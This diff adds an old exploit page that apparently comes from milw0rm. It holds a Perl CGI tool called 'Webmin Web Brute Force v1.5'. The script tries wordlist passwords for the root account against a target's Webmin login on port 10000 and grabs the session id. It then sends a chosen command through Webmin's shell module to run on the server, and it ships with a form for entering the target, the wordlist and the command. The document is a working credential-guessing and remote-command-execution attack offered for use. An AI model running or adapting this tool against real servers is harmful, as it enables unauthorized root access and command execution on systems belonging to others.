@@ -1,0 +1,154 @@
+<html>
+<head>
+<title>Webmin Web Brute Force v1.5 (cgi-version)</title>
+<pre>
+#!/usr/bin/perl
+
+use CGI qw(:standard);
+use IO::Socket;
+$CGI::HEADERS_ONCE = 1;
+$CGI = new CGI;
+
+$atak = $CGI-&gt;param(&quot;atak&quot;);
+$host = $CGI-&gt;param(&quot;host&quot;);
+$wlist = $CGI-&gt;param(&quot;wlist&quot;);
+$cmd = $CGI-&gt;param(&quot;cmd&quot;);
+
+print $CGI-&gt;header(-type=&gt;'text/html',-charset=&gt;'windows-1254');
+print qq~&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=Content-Type&quot; content=text/html;
+charset=ISO-8859-9&gt;&lt;title&gt;Webmin Web Brute Force v1.5 - cgi
+versiyon&lt;/title&gt;&lt;/head&gt;
+&lt;body bgcolor=black text=red&gt;Webmin Web Brute Force v1.5 - cgi versiyon&lt;br&gt;
+&lt;font color=blue&gt;
+Webmin BruteForce + Command execution- cgi version&lt;br&gt;
+v1.0:By Di42lo  - DiAblo_2@012.net.il&lt;br&gt;
+v1.5:By ZzagorR - zzagorrzzagorr@hotmail.com - www.rootbinbash.com&lt;br&gt;
+&lt;/font&gt;~;
+if($atak eq &quot;webmin&quot;) {
+  open (data, &quot;$wlist&quot;);
+  @wordlist=&lt;data&gt;;
+  close data;
+  $passx=@wordlist;
+  $chk=0;
+  $sock = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$host&quot;,
+PeerPort =&gt; &quot;10000&quot;,Timeout  =&gt; 25) || die &quot;[-] Webmin on this host does not
+exist\r\n&quot;;
+  $sock-&gt;close;
+  print &quot;[+] BruteForcing...&lt;br&gt;&quot;;
+  $sid;
+  $n=0;
+  while ($chk!=1) {
+     $n++;
+     if($n&gt;$passx){
+       exit;
+     }
+     $pass=@wordlist[$passx-$n];
+     $pass_line=&quot;page=%2F&amp;user=root&amp;pass=$pass&quot;;
+     $buffer=&quot;POST /session_login.cgi HTTP/1.0\n&quot;.
+     &quot;Host: $host:10000\n&quot;.
+     &quot;Keep-Alive: 300\n&quot;.
+     &quot;Connection: keep-alive\n&quot;.
+     &quot;Referer: http://$host:10000/\n&quot;.
+     &quot;Cookie: testing=1\n&quot;.
+     &quot;Content-Type: application/x-www-form-urlencoded\n&quot;.
+     &quot;Content-Length: __\n&quot;.
+     &quot;\n&quot;.
+     $pass_line.&quot;\n\n&quot;;
+     $line_size=length($pass_line);
+     $buffer=~s/__/$line_size/g;
+     $sock = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$host&quot;,
+PeerPort =&gt; &quot;10000&quot;,Timeout  =&gt; 25);
+     if ($sock){
+        print &quot;[+] Denenen sifre: $pass&lt;br&gt;&quot;;
+        print $sock $buffer;
+        while ($answer=&lt;$sock&gt;){
+              if ($answer=~/sid=(.*);/g){
+                 $chk=1;
+                 $sid=$1;
+                 print &quot;[+] Found SID : $sid&lt;br&gt;&quot;;
+                 print &quot;[+] Sifre : $pass&lt;br&gt;&quot;;
+              }
+        }
+     }
+     $sock-&gt;close;
+}
+print &quot;[+] Connecting to host once again&lt;br&gt;&quot;;
+$sock = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$host&quot;, PeerPort
+=&gt; &quot;10000&quot;,Timeout  =&gt; 10) || die &quot;[-] Cant Connect once again for command
+execution\n&quot;;
+print &quot;[+] Connected.. Sending Buffer&lt;br&gt;&quot;;
+$temp=&quot;-----------------------------19777347561180971495777867604\n&quot;.
+        &quot;Content-Disposition: form-data; name=\&quot;cmd\&quot;\n&quot;.
+        &quot;\n&quot;.
+        &quot;$cmd\n&quot;.
+        &quot;-----------------------------19777347561180971495777867604\n&quot;.
+        &quot;Content-Disposition: form-data; name=\&quot;pwd\&quot;\n&quot;.
+        &quot;\n&quot;.
+        &quot;/root\n&quot;.
+        &quot;-----------------------------19777347561180971495777867604\n&quot;.
+        &quot;Content-Disposition: form-data; name=\&quot;history\&quot;\n&quot;.
+        &quot;\n&quot;.
+        &quot;\n&quot;.
+        &quot;-----------------------------19777347561180971495777867604\n&quot;.
+        &quot;Content-Disposition: form-data; name=\&quot;previous\&quot;\n&quot;.
+        &quot;\n&quot;.
+        &quot;$cmd\n&quot;.
+        &quot;-----------------------------19777347561180971495777867604\n&quot;.
+        &quot;Content-Disposition: form-data; name=\&quot;pcmd\&quot;\n&quot;.
+        &quot;\n&quot;.
+        &quot;$cmd\n&quot;.
+        &quot;-----------------------------19777347561180971495777867604--\n\n&quot;;
+$buffer_size=length($temp);
+$buffer=&quot;POST /shell/index.cgi HTTP/1.1\n&quot;.
+       &quot;Host: $host:10000\n&quot;.
+       &quot;Keep-Alive: 300\n&quot;.
+       &quot;Connection: keep-alive\n&quot;.
+       &quot;Referer: http://$host:10000/shell/\n&quot;.
+       &quot;Cookie: sid=$sid\; testing=1; x\n&quot;.
+       &quot;Content-Type: multipart/form-data;
+boundary=---------------------------19777347561180971495777867604\n&quot;.
+       &quot;Content-Length: siz\n&quot;.
+       &quot;\n&quot;.
+$temp;
+$buffer=~s/siz/$buffer_size/g;
+print $sock $buffer;
+
+if ($sock){
+  print &quot;[+] Buffer sent...running command $cmd&lt;br&gt;&quot;;
+  print $sock $buffer;
+  while ($answer=&lt;$sock&gt;){
+        if ($answer=~/defaultStatus=&quot;(.*)&quot;;/g) { print $1.&quot;&lt;br&gt;&quot;;}
+        if ($answer=~/&lt;td&gt;&lt;pre&gt;&lt;b&gt;&gt;/g){
+           $cmd_chk=1;
+        }
+        if ($cmd_chk==1) {
+           if ($answer=~/&lt;\/pre&gt;&lt;\/td&gt;&lt;\/tr&gt;/g){
+              exit;
+           } else {
+              print $answer;
+           }
+        }
+  }
+}
+}
+
+if($atak eq &quot;&quot;){
+print qq~
+&lt;table align=left cellspacing=&quot;0&quot; cellpading=&quot;0&quot;&gt;&lt;form aciton=?&gt;&lt;input
+type=hidden name=atak value=webmin&gt;
+&lt;tr&gt;&lt;td colspan=&quot;3&quot; align=center&gt;Webmin Web Brute Force v1.5 - cgi
+version&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;Server:&lt;/td&gt;&lt;td colspan=&quot;2&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;host&quot; size=&quot;50&quot;
+value=&quot;www.&quot;&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;Wordlist:&lt;/td&gt;&lt;td valign=&quot;top&quot;&gt;&lt;input type=&quot;file&quot;
+name=&quot;wlist&quot;&gt;&lt;/td&gt;&lt;td valign=&quot;top&quot;
+align=&quot;left&quot;&gt;Examples:&lt;br&gt;---------&lt;br&gt;admin&lt;br&gt;administrator&lt;br&gt;redhat&lt;br&gt;mandrake&lt;br&gt;suse&lt;br&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;Cmd:&lt;/td&gt;&lt;td colspan=&quot;2&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;cmd&quot; size=&quot;50&quot;
+value=&quot;uptime&quot;&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td colspan=&quot;3&quot; align=&quot;center&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;&quot;
+value=&quot;Gooooooo!&quot;&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;/form&gt;&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;~;
+}</pre>
+# milw0rm.com [2005-01-08]
+</html>
+
